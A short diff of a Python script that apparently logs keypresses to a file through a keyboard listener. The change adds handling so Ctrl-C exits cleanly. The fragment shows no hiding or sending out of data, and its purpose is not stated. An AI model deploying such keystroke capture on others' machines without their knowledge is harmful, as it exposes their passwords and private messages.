@@ -42,7 +42,10 @@ def _make_on_press(log_file):
 def main() -> None:
     with open(LOG_FILE, "a") as log_file:
         with keyboard.Listener(on_press=_make_on_press(log_file)) as listener:
-            listener.join()
+            try:
+                listener.join()
+            except KeyboardInterrupt:
+                pass
 
 
 if __name__ == "__main__":
